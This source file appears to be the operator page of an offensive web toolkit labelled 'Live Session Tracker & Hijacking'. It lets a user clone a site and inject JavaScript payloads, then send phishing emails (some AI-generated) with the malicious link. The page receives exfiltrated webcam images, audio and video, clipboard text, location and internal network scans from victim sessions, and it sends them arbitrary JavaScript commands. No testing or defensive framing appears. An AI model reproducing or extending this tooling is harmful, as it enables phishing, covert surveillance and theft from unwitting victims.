
'use client';

import { useState, useEffect, useRef } from 'react';
import { LiveTracker, type TrackedEvent } from '@/components/live-tracker';
import { JavaScriptLibrary } from '@/components/javascript-library';
import { Separator } from '@/components/ui/separator';
import { useLocalStorage } from '@/hooks/use-local-storage';
import { LocationTracker } from '@/components/location-tracker';
import { InternalNetworkScannerResults } from '@/components/internal-network-scanner-results';
import { PortScannerResults } from '@/components/port-scanner-results';
import { ClipboardMonitor } from '@/components/clipboard-monitor';
import { SessionHistory } from '@/components/live-tracker/session-history';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Webcam, Video, Mic, Terminal, Info, Mail, Sparkles, Send as SendIcon, Save, PlusCircle, Link as LinkIcon, Eye, ClipboardCopy, Bold, Italic, Underline, Pilcrow, Image as ImageIcon, StopCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/hooks/use-auth';
import { logActivity } from '@/services/activity-log-service';
import Image from 'next/image';
import { Textarea } from '@/components/ui/textarea';
import { Label } from '@/components/ui/label';
import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
import type { JsPayload } from '@/types';
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogFooter } from '@/components/ui/dialog';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Input } from '@/components/ui/input';
import { generatePhishingEmail, type PhishingOutput } from '@/ai/flows/phishing-flow';
import { sendTestEmail, type SmtpConfig } from '@/actions/send-email-action';
import { Loader2 } from 'lucide-react';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { ScrollArea } from '@/components/ui/scroll-area';
import { initialTemplates, type Template } from '@/lib/templates';
import { EmailOutbox, SentEmail } from '@/components/email-outbox';


const linkTypeSchema = z.enum(['text', 'button', 'image']);

const emailFormSchema = z.object({
  recipientEmail: z.string().email(),
  linkType: linkTypeSchema,
  linkText: z.string().optional(),
  imageUrl: z.string().optional(),
}).refine(data => data.linkType !== 'image' || (data.imageUrl && data.imageUrl.length > 0), {
    message: "Image URL is required for image link type.",
    path: ["imageUrl"],
}).refine(data => data.linkType !== 'button' || (data.linkText && data.linkText.length > 0), {
    message: "Button text is required.",
    path: ["linkText"],
});


const newTemplateSchema = z.object({
  name: z.string().min(3, 'Name is required.'),
  subject: z.string().min(3, 'Subject is required.'),
  body: z.string().min(10, 'Body is required.'),
});

const aiTemplateSchema = z.object({
  scenario: z.string().min(10, 'Scenario description is required.'),
});

const getTemplateVariables = (template: Template | null): string[] => {
    if (!template) return [];
    const combinedText = `${template.subject || ''} ${template.body}`;
    const matches = combinedText.match(/\{\{([a-zA-Z0-9_]+)\}\}/g) || [];
    const uniqueMatches = [...new Set(matches)];
    return uniqueMatches.map(v => v.replace(/[{}]/g, ''));
};

const customEmailSchema = z.object({
    subject: z.string().min(1, 'Subject is required.'),
    body: z.string().min(1, 'Body is required.'),
    recipientEmail: z.string().email(),
    cc: z.string().optional(),
    bcc: z.string().optional(),
});


export default function LiveTrackerPage() {
  const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
  const { value: sessions, setValue: setSessions } = useLocalStorage<Record<string, TrackedEvent[]>>('netra-sessions', {});
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);

  const [isCameraActive, setIsCameraActive] = useState(false);
  const [isMicActive, setIsMicActive] = useState(false);
  const [isRecording, setIsRecording] = useState<'video' | 'audio' | null>(null);
  const [liveFeedSrc, setLiveFeedSrc] = useState<string | null>(null);
  
  const [command, setCommand] = useState('');
  
  const { toast } = useToast();
  const { user } = useAuth();
  const channelRef = useRef<BroadcastChannel | null>(null);

  const [isEmailModalOpen, setIsEmailModalOpen] = useState(false);
  const [emailTemplates, setEmailTemplates] = useState<Template[]>([]);
  const [selectedTemplate, setSelectedTemplate] = useState<Template | null>(null);
  const [templateVariables, setTemplateVariables] = useState<string[]>([]);
  const [variableValues, setVariableValues] = useState<Record<string, string>>({});
  const [generatedAiEmail, setGeneratedAiEmail] = useState<PhishingOutput | null>(null);
  const [isGeneratingAiEmail, setIsGeneratingAiEmail] = useState(false);
  const [isSendingEmail, setIsSendingEmail] = useState(false);
  const [smtpConfig, setSmtpConfig] = useState<SmtpConfig | null>(null);
  const [hostedUrlForEmail, setHostedUrlForEmail] = useState<string>('');
  const { value: sentEmails, setValue: setSentEmails } = useLocalStorage<SentEmail[]>('netra-email-outbox', []);
  const [currentEmailTab, setCurrentEmailTab] = useState('custom');
  const customBodyRef = useRef<HTMLTextAreaElement>(null);
  
  const emailForm = useForm<z.infer<typeof emailFormSchema>>({ 
    resolver: zodResolver(emailFormSchema),
    defaultValues: { recipientEmail: '', linkType: 'text', linkText: 'Click Here', imageUrl: '' },
  });
  const newTemplateForm = useForm<z.infer<typeof newTemplateSchema>>({ resolver: zodResolver(newTemplateSchema), defaultValues: { name: '', subject: '', body: '' } });
  const aiTemplateForm = useForm<z.infer<typeof aiTemplateSchema>>({ resolver: zodResolver(aiTemplateSchema), defaultValues: { scenario: 'A critical security alert requiring immediate action.' } });
  const customEmailForm = useForm<z.infer<typeof customEmailSchema>>({ 
      resolver: zodResolver(customEmailSchema), 
      defaultValues: { subject: '', body: '', recipientEmail: '', cc: '', bcc: '' }
  });


  const handleSelectPayload = (payload: JsPayload) => {
    setSelectedPayload(payload);
  }
  
  const sessionsMap = new Map(Object.entries(sessions));

  const setSessionsFromMap = (newMap: Map<string, TrackedEvent[]>) => {
    setSessions(Object.fromEntries(newMap.entries()));
  };
  
  const resetStateForSession = () => {
    setIsCameraActive(false);
    setIsMicActive(false);
    setLiveFeedSrc(null);
    setIsRecording(null);
  }

  useEffect(() => {
    channelRef.current = new BroadcastChannel('netrax_c2_channel');
    
    const handleC2Message = (event: MessageEvent) => {
      const newEvent = event.data;
      if (!newEvent.sessionId) return;
      
      setSessions(prevSessions => {
        const currentSessionEvents = prevSessions[newEvent.sessionId] || [];
        const updatedEvents = [...currentSessionEvents, newEvent];
        return {
          ...prevSessions,
          [newEvent.sessionId]: updatedEvents
        };
      });

      if (newEvent.sessionId === selectedSessionId) {
        if (newEvent.type === 'media-stream') {
            const { data } = newEvent;
            switch(data.type) {
                case 'image-snapshot':
                    setLiveFeedSrc(data.snapshot);
                    setIsCameraActive(true);
                    break;
                case 'video/webm':
                    toast({ title: "Video Received", description: `A video recording was exfiltrated.`});
                    setIsRecording(null);
                    break;
                case 'audio/webm':
                    toast({ title: "Audio Received", description: `An audio recording was exfiltrated.`});
                    setIsRecording(null);
                    break;
                case 'status':
                    if (data.message === 'Permissions granted.') {
                        setIsCameraActive(true);
                        setIsMicActive(true);
                        toast({ title: 'Permissions Granted', description: `Session ${newEvent.sessionId} has camera/mic access.`});
                    } else if (data.message === 'Stream stopped.') {
                        setIsCameraActive(false);
                        setIsMicActive(false);
                        setLiveFeedSrc(null);
                        setIsRecording(null);
                        toast({ variant: 'destructive', title: 'Stream Stopped', description: `Session ${newEvent.sessionId} has stopped the media stream.`});
                    } else {
                        toast({ variant: 'destructive', title: 'Permission Error', description: `Session ${newEvent.sessionId} reported: ${data.message}`});
                    }
                    break;
                default:
                    toast({ title: 'Media Received', description: `Received media of type ${data.type}`});
            }
        }
      }
    };

    channelRef.current.addEventListener('message', handleC2Message);
    return () => {
        channelRef.current?.removeEventListener('message', handleC2Message);
        channelRef.current?.close();
    };
  }, [setSessions, selectedSessionId, toast]);
  
   useEffect(() => {
    if (!selectedSessionId && sessionsMap.size > 0) {
      const firstSessionId = sessionsMap.keys().next().value;
      setSelectedSessionId(firstSessionId);
    }
  }, [sessionsMap, selectedSessionId]);

  const sendCommandToSession = (command: string, isJsCode = false) => {
    if (!selectedSessionId) {
        toast({ variant: 'destructive', title: 'No session selected' });
        return;
    }
    
    const payload = { 
        type: 'command', 
        sessionId: selectedSessionId, 
        command: isJsCode ? 'execute-js' : command,
        ...(isJsCode && { code: command })
    };
    
    channelRef.current?.postMessage(payload);
    
    const action = isJsCode ? 'Sent JS Command' : `Sent command: ${command}`;
    const details = isJsCode ? `Code: ${command.substring(0, 50)}...` : `Session: ${selectedSessionId}`;
    
    logActivity({ user: user?.displayName || 'Operator', action, details });
  };
  
  const handleSendCommandConsole = () => {
      if (!command) return;
      sendCommandToSession(command, true);
      toast({ title: "Command Sent", description: "The JavaScript command has been sent to the target."});
      setCommand('');
  }
  
  const handleRecording = (type: 'video' | 'audio') => {
      const command = `start-${type}-record`;
      sendCommandToSession(command);
      setIsRecording(type);
      toast({ title: `${type.charAt(0).toUpperCase() + type.slice(1)} Recording Started`});
  }
  
  const handleStopRecording = () => {
      if (!isRecording) return;
      const command = `stop-${isRecording}-record`;
      sendCommandToSession(command);
      toast({ title: 'Stop Recording Command Sent' });
  }

  const openEmailModal = (url: string) => {
    setHostedUrlForEmail(url);
    const storedTemplates = localStorage.getItem('netra-templates');
    const allTemplates = storedTemplates ? JSON.parse(storedTemplates) : initialTemplates;
    setEmailTemplates(allTemplates.filter((t: Template) => t.type === 'Email'));
    const storedSmtp = JSON.parse(localStorage.getItem('netra-email-settings') || 'null');
    setSmtpConfig(storedSmtp);
    setSelectedTemplate(null);
    setGeneratedAiEmail(null);
    setTemplateVariables([]);
    setVariableValues({});
    newTemplateForm.reset();
    aiTemplateForm.reset();
    emailForm.reset({ recipientEmail: '', linkType: 'text', linkText: 'Click Here', imageUrl: '' });
    customEmailForm.reset({ subject: '', body: '', recipientEmail: '', cc: '', bcc: '' });
    setIsEmailModalOpen(true);
  };
  
  const handleSaveNewTemplate = (values: z.infer<typeof newTemplateSchema>) => {
    const newTemplate: Template = { ...values, id: crypto.randomUUID(), type: 'Email' };
    const updatedTemplates = [newTemplate, ...emailTemplates];
    setEmailTemplates(updatedTemplates);
    localStorage.setItem('netra-templates', JSON.stringify(updatedTemplates));
    setSelectedTemplate(newTemplate);
    toast({ title: "Template Saved", description: "Your new template has been saved and selected."});
    setCurrentEmailTab('select');
    newTemplateForm.reset();
  };
  
  const handleGenerateAIEmail = async (values: z.infer<typeof aiTemplateSchema>) => {
    setIsGeneratingAiEmail(true);
    setGeneratedAiEmail(null);
    try {
      const email = await generatePhishingEmail({
        company: 'Target Company',
        role: 'Employee',
        scenario: values.scenario,
      });
      setGeneratedAiEmail(email);
      const aiTemplate = { id: 'ai-generated', name: 'AI Generated Email', type: 'Email', ...email };
      setSelectedTemplate(aiTemplate);
    } catch (e) {
      toast({ variant: 'destructive', title: 'AI Generation Failed' });
    } finally {
      setIsGeneratingAiEmail(false);
    }
  };
  
  const insertHtmlTag = (tag: 'b' | 'i' | 'u') => {
    const textarea = customBodyRef.current;
    if (!textarea) return;
    const start = textarea.selectionStart;
    const end = textarea.selectionEnd;
    const selectedText = textarea.value.substring(start, end);
    const newText = `${textarea.value.substring(0, start)}<${tag}>${selectedText}</${tag}>${textarea.value.substring(end)}`;
    customEmailForm.setValue('body', newText);
  };
  
  const onSendEmail = async () => {
    if (!smtpConfig) {
        toast({ variant: 'destructive', title: 'SMTP Not Configured', description: 'Please configure email settings.' });
        return;
    }
    
    setIsSendingEmail(true);
    let subject = '';
    let body = '';
    let recipient = '';

    if (currentEmailTab === 'custom') {
        const customValues = customEmailForm.getValues();
        const validation = await customEmailForm.trigger();
        if (!validation) {
            setIsSendingEmail(false);
            return;
        }
        subject = customValues.subject;
        body = customValues.body;
        recipient = customValues.recipientEmail;
    } else {
        const emailValues = emailForm.getValues();
         const validation = await emailForm.trigger();
        if (!validation) {
            setIsSendingEmail(false);
            return;
        }
        if (!selectedTemplate) {
            toast({ variant: 'destructive', title: 'No Template Selected' });
            setIsSendingEmail(false);
            return;
        }
        subject = selectedTemplate.subject || 'Important Notification';
        body = renderPreview(selectedTemplate.body, true);
        recipient = emailValues.recipientEmail;
    }

    try {
        let finalBody = body.replace(/\\n/g, '<br />'); 
        let finalSubject = subject;
        
        if(currentEmailTab !== 'custom') {
            finalBody = renderPreview(finalBody, true);
            finalSubject = renderPreview(finalSubject);
        }

        await sendTestEmail({
            ...smtpConfig,
            recipientEmail: recipient,
            subject: finalSubject,
            html: finalBody,
            text: finalBody.replace(/<[^>]+>/g, ''),
        });

        const newSentEmail: SentEmail = {
            id: crypto.randomUUID(),
            recipient: recipient,
            subject: finalSubject,
            timestamp: new Date().toISOString(),
            status: 'Sent'
        };
        setSentEmails([newSentEmail, ...sentEmails]);

        toast({ title: 'Email Sent!', description: `Phishing email delivered to ${recipient}.`});
        setIsEmailModalOpen(false);
    } catch (e) {
        toast({ variant: 'destructive', title: 'Failed to Send Email', description: e instanceof Error ? e.message : 'An unknown error occurred.' });
    } finally {
        setIsSendingEmail(false);
    }
  };

  useEffect(() => {
    const variables = getTemplateVariables(selectedTemplate);
    setTemplateVariables(variables);
    setVariableValues({});
  }, [selectedTemplate]);
  
  const handleVariableChange = (key: string, value: string) => {
    setVariableValues(prev => ({ ...prev, [key]: value }));
  };

  const renderPreview = (text?: string, forSending: boolean = false): string => {
      if (!text) return '';
      let renderedText = text;
      
      const emailFormValues = emailForm.getValues();

      for (const key in variableValues) {
          const value = variableValues[key] || (forSending ? '' : `{{${key}}}`);
          renderedText = renderedText.replace(new RegExp(`\\{\\{${key}\\}\\}`, 'g'), value);
      }
      
      let linkHtml = '';
      switch (emailFormValues.linkType) {
        case 'button':
            linkHtml = `<a href="${hostedUrlForEmail}" target="_blank" style="display:inline-block;background-color:#1a73e8;color:white;padding:10px 20px;text-decoration:none;border-radius:5px;">${emailFormValues.linkText || 'Click Here'}</a>`;
            break;
        case 'image':
            linkHtml = `<a href="${hostedUrlForEmail}" target="_blank"><img src="${emailFormValues.imageUrl || 'https://placehold.co/200x50.png'}" alt="${emailFormValues.linkText || 'Clickable Image'}"></a>`;
            break;
        case 'text':
        default:
            linkHtml = `<a href="${hostedUrlForEmail}" target="_blank" style="color:hsl(var(--accent));font-weight:bold;text-decoration:underline;">${emailFormValues.linkText || 'Click Here'}</a>`;
            break;
      }
      
      renderedText = renderedText.replace(/\[Link\]|\[(.*?)\]/gi, linkHtml);
      return renderedText;
  }

  const currentSessionEvents = selectedSessionId ? sessions[selectedSessionId] || [] : [];
  const location = currentSessionEvents.slice().reverse().find(e => e.type === 'location' && e.data.latitude)?.data;
  const internalIps = [...new Set(currentSessionEvents.filter(e => e.type === 'internal-ip-found').map(e => e.data.ip))];
  const openPorts = [...new Set(currentSessionEvents.filter(e => e.type === 'port-scan-result').map(e => e.data))];
  const clipboardContent = currentSessionEvents.slice().reverse().find(e => e.type === 'clipboard-read')?.data.pastedText || null;


  return (
    <>
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Live Session Tracker & Hijacking</h1>
        <p className="text-muted-foreground">Inject JS payloads, hijack devices, and monitor real-time user interactions.</p>
      </div>
      
      <Card className="bg-primary/10 border-accent/20">
          <CardHeader>
            <div className="flex items-center gap-3">
                <Info className="h-6 w-6 text-accent" />
                <CardTitle>How to Use This Module</CardTitle>
            </div>
          </CardHeader>
          <CardContent className="text-sm text-muted-foreground">
            <ol className="list-decimal list-inside space-y-2">
              <li>
                <strong>Select a Payload:</strong> In the "JavaScript Payload Library" below, choose a premade payload, create a custom one, or generate one with AI. Clicking "Use Payload" will load it into the cloner.
              </li>
              <li>
                <strong>Configure the Cloner:</strong> In the "Advanced Webpage Cloner", enter the URL of the site you want to inject the payload into.
              </li>
              <li>
                <strong>Generate Link:</strong> Click "Clone & Inject JS" followed by "Generate Public Link". This creates a unique URL for your malicious page.
              </li>
              <li>
                <strong>Deliver the Link:</strong> Send the generated URL to your target. You can now use the **"Send by Email"** button to craft and send a phishing email directly from here.
              </li>
              <li>
                <strong>Monitor Activity:</strong> When the target opens the link, a new session will appear in the "Session History". Click on it to see all captured data (keystrokes, clicks, etc.) in the "Activity Log".
              </li>
            </ol>
          </CardContent>
        </Card>

      <AdvancedPageCloner selectedPayload={selectedPayload} onLinkGenerated={openEmailModal} />
      
      <Separator className="my-4" />
      
      <div className="grid grid-cols-1 xl:grid-cols-3 gap-6 items-start">
        <div className="xl:col-span-2 flex flex-col gap-6">
          <LiveTracker sessions={sessionsMap} selectedSessionId={selectedSessionId} />
          <JavaScriptLibrary onSelectPayload={setSelectedPayload}/>
          <EmailOutbox sentEmails={sentEmails} />
        </div>
        <div className="xl:col-span-1 flex flex-col gap-6">
          <SessionHistory sessions={sessions} setSessions={setSessions} selectedSessionId={selectedSessionId} setSelectedSessionId={setSelectedSessionId} resetState={resetStateForSession} />
          
            <Card className="bg-primary/10">
              <CardHeader>
                  <CardTitle className="text-lg flex items-center gap-2"><Video className="h-5 w-5"/> Media Control</CardTitle>
                  { (isCameraActive || isMicActive) && <Badge variant="destructive" className="w-fit"><Webcam className="mr-2 h-4 w-4"/> LIVE</Badge> }
              </CardHeader>
              <CardContent className="space-y-4">
                  <div className="w-full aspect-video rounded-md bg-black flex items-center justify-center overflow-hidden">
                      {liveFeedSrc ? <Image src={liveFeedSrc} alt="Live feed" width={640} height={480} className="w-full h-full object-contain"/> : <p className="text-muted-foreground text-sm">Camera feed inactive.</p>}
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                      <Button onClick={() => sendCommandToSession('start-video')} disabled={!selectedSessionId || isCameraActive}>Start Camera</Button>
                      <Button onClick={() => sendCommandToSession('stop-stream')} disabled={!isCameraActive && !isMicActive} variant="destructive">Stop Stream</Button>
                      <Button onClick={() => handleRecording('video')} disabled={!isCameraActive || isRecording !== null}>Record Video</Button>
                      <Button onClick={() => handleRecording('audio')} disabled={!isMicActive || isRecording !== null}>Record Audio</Button>
                      <Button onClick={handleStopRecording} disabled={!isRecording} variant="destructive" className="col-span-2">Stop Recording</Button>
                      <Button onClick={() => sendCommandToSession('capture-image')} disabled={!isCameraActive} className="col-span-2">Capture Image</Button>
                  </div>
              </CardContent>
            </Card>
            
            <Card>
              <CardHeader>
                  <CardTitle className="text-lg flex items-center gap-2"><Terminal className="h-5 w-5"/> Command Console</CardTitle>
                  <CardDescription>Execute arbitrary JavaScript in the selected session.</CardDescription>
              </CardHeader>
              <CardContent className="space-y-2">
                  <Label htmlFor="js-command">JavaScript Code</Label>
                  <Textarea id="js-command" value={command} onChange={(e) => setCommand(e.target.value)} className="font-mono h-24" placeholder="e.g., alert(document.domain)"/>
                  <Button onClick={handleSendCommandConsole} disabled={!selectedSessionId || !command} className="w-full">Send Command</Button>
              </CardContent>
            </Card>

          <InternalNetworkScannerResults ips={internalIps} />
          <PortScannerResults ports={openPorts} />
          <ClipboardMonitor content={clipboardContent} />
          <LocationTracker location={location ? { lat: location.latitude, lon: location.longitude } : null} />
        </div>
      </div>
    </div>

     <Dialog open={isEmailModalOpen} onOpenChange={setIsEmailModalOpen}>
        <DialogContent className="max-w-4xl h-[90vh] md:h-auto flex flex-col">
          <DialogHeader>
            <DialogTitle>New Message</DialogTitle>
          </DialogHeader>
          {!smtpConfig && (
            <div className="my-4 p-4 bg-destructive/10 border border-destructive/20 rounded-md text-sm text-destructive">
              <strong>SMTP Not Configured.</strong> You must configure email settings before you can send emails.
            </div>
          )}
          <div className="grid md:grid-cols-2 gap-8 py-4 overflow-y-auto md:overflow-visible">
            <div className="space-y-4">
              <Tabs defaultValue="custom" value={currentEmailTab} onValueChange={setCurrentEmailTab}>
                <TabsList className="grid w-full grid-cols-4">
                  <TabsTrigger value="select">Select</TabsTrigger>
                  <TabsTrigger value="custom">Custom</TabsTrigger>
                  <TabsTrigger value="new">New</TabsTrigger>
                  <TabsTrigger value="ai">AI</TabsTrigger>
                </TabsList>
                <TabsContent value="select" className="space-y-2">
                  <Label>Select an existing template:</Label>
                  <Select onValueChange={(id) => setSelectedTemplate(emailTemplates.find(t => t.id === id) || null)}>
                    <SelectTrigger><SelectValue placeholder="Choose a template..."/></SelectTrigger>
                    <SelectContent><ScrollArea className="h-60">
                      {emailTemplates.map(t => <SelectItem key={t.id} value={t.id}>{t.name}</SelectItem>)}
                    </ScrollArea></SelectContent>
                  </Select>
                </TabsContent>
                 <TabsContent value="custom">
                   <Form {...customEmailForm}>
                     <div className="space-y-2">
                        <FormField control={customEmailForm.control} name="recipientEmail" render={({field}) => (<FormItem><Input placeholder="To" type="email" className="border-0 border-b rounded-none focus-visible:ring-0" {...field}/><FormMessage/></FormItem>)}/>
                         <FormField control={customEmailForm.control} name="cc" render={({field}) => (<FormItem><Input placeholder="Cc" className="border-0 border-b rounded-none focus-visible:ring-0" {...field}/><FormMessage/></FormItem>)}/>
                         <FormField control={customEmailForm.control} name="bcc" render={({field}) => (<FormItem><Input placeholder="Bcc" className="border-0 border-b rounded-none focus-visible:ring-0" {...field}/><FormMessage/></FormItem>)}/>
                         <FormField control={customEmailForm.control} name="subject" render={({field}) => (<FormItem><Input placeholder="Subject" className="border-0 border-b rounded-none focus-visible:ring-0" {...field}/><FormMessage/></FormItem>)}/>
                         <FormField control={customEmailForm.control} name="body" render={({field}) => (<FormItem><Textarea placeholder="Email body..." {...field} ref={customBodyRef} className="h-40 font-sans border-0 rounded-none focus-visible:ring-0" /><FormMessage/></FormItem>)}/>
                         <div className="border-t p-2 flex items-center gap-1">
                           <Button type="button" variant="ghost" size="icon" onClick={() => insertHtmlTag('b')}><Bold className="h-4 w-4"/></Button>
                           <Button type="button" variant="ghost" size="icon" onClick={() => insertHtmlTag('i')}><Italic className="h-4 w-4"/></Button>
                           <Button type="button" variant="ghost" size="icon" onClick={() => insertHtmlTag('u')}><Underline className="h-4 w-4"/></Button>
                         </div>
                     </div>
                   </Form>
                </TabsContent>
                <TabsContent value="new">
                  <Form {...newTemplateForm}><form onSubmit={newTemplateForm.handleSubmit(handleSaveNewTemplate)} className="space-y-3">
                    <FormField control={newTemplateForm.control} name="name" render={({field}) => (<FormItem><Input placeholder="Template Name" {...field}/><FormMessage/></FormItem>)}/>
                    <FormField control={newTemplateForm.control} name="subject" render={({field}) => (<FormItem><Input placeholder="Email Subject" {...field}/><FormMessage/></FormItem>)}/>
                    <FormField control={newTemplateForm.control} name="body" render={({field}) => (<FormItem><Textarea placeholder="Email body... Use {{variables}} and a [Link] placeholder." {...field} className="h-28"/><FormMessage/></FormItem>)}/>
                    <Button type="submit" size="sm" className="w-full"><Save className="mr-2 h-4 w-4"/>Save as New Template</Button>
                  </form></Form>
                </TabsContent>
                 <TabsContent value="ai">
                   <Form {...aiTemplateForm}><form onSubmit={aiTemplateForm.handleSubmit(handleGenerateAIEmail)} className="space-y-3">
                     <FormField control={aiTemplateForm.control} name="scenario" render={({field}) => (<FormItem><Textarea placeholder="Describe the phishing scenario..." {...field} className="h-28"/><FormMessage/></FormItem>)}/>
                     <Button type="submit" size="sm" className="w-full" disabled={isGeneratingAiEmail}>
                       {isGeneratingAiEmail ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Sparkles className="mr-2 h-4 w-4"/>}
                       Generate with AI
                      </Button>
                   </form></Form>
                </TabsContent>
              </Tabs>
              {templateVariables.length > 0 && currentEmailTab === 'select' && (
                <div className="space-y-2 border-t pt-4">
                  <Label>Personalization Variables</Label>
                  {templateVariables.map(variable => (
                    <div key={variable} className="grid grid-cols-3 items-center gap-4">
                      <Label htmlFor={`var-${variable}`} className="text-right text-xs font-mono">{`{{${variable}}}`}</Label>
                      <Input id={`var-${variable}`} value={variableValues[variable] || ''} onChange={(e) => handleVariableChange(variable, e.target.value)} className="col-span-2"/>
                    </div>
                  ))}
                </div>
              )}
               {currentEmailTab !== 'custom' && (
                <Form {...emailForm}>
                    <div className="space-y-4 border-t pt-4">
                        <FormField control={emailForm.control} name="recipientEmail" render={({field}) => (<FormItem><Label>Recipient Email</Label><Input type="email" placeholder="target@example.com" {...field}/><FormMessage /></FormItem>)}/>
                        <FormField control={emailForm.control} name="linkType" render={({ field }) => (
                            <FormItem>
                                <Label>Link Format</Label>
                                <Select onValueChange={field.onChange} defaultValue={field.value}>
                                    <FormControl><SelectTrigger><SelectValue/></SelectTrigger></FormControl>
                                    <SelectContent>
                                        <SelectItem value="text">Plain Text Link</SelectItem>
                                        <SelectItem value="button">Styled Button</SelectItem>
                                        <SelectItem value="image">Clickable Image</SelectItem>
                                    </SelectContent>
                                </Select>
                            </FormItem>
                        )}/>
                        {emailForm.watch('linkType') === 'image' ? (
                             <FormField control={emailForm.control} name="imageUrl" render={({ field }) => (<FormItem><Label>Image URL</Label><Input placeholder="https://placehold.co/200x50.png" {...field} /><FormMessage /></FormItem>)} />
                        ) : (
                             <FormField control={emailForm.control} name="linkText" render={({ field }) => (<FormItem><Label>Link/Button Text</Label><Input placeholder="e.g., Click Here, Verify Account" {...field} /><FormMessage /></FormItem>)} />
                        )}
                    </div>
                </Form>
               )}
            </div>
            <div className="space-y-2">
              <Label>Live Preview</Label>
              <Card className="h-full min-h-[50vh] md:min-h-full">
                <CardContent className="p-4 h-full overflow-y-auto">
                  {currentEmailTab === 'custom' ? (
                     <div className="prose prose-sm dark:prose-invert max-w-none">
                      <h3 className="!my-0">{renderPreview(customEmailForm.watch('subject'))}</h3>
                      <div dangerouslySetInnerHTML={{ __html: renderPreview(customEmailForm.watch('body')).replace(/\\n/g, '<br />') }}/>
                    </div>
                  ) : !selectedTemplate ? (
                    <p className="text-muted-foreground text-center pt-20">Select or generate a template.</p>
                  ) : (
                    <div className="prose prose-sm dark:prose-invert max-w-none">
                      <h3 className="!my-0">{renderPreview(selectedTemplate.subject)}</h3>
                      <div dangerouslySetInnerHTML={{ __html: renderPreview(selectedTemplate.body) }}/>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </div>
           <DialogFooter>
             <Button type="button" variant="outline" onClick={() => setIsEmailModalOpen(false)}>Cancel</Button>
             <Button onClick={onSendEmail} disabled={!smtpConfig || isSendingEmail}>
                {isSendingEmail ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <SendIcon className="mr-2 h-4 w-4"/>}
                Send Email
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </>
  );
}
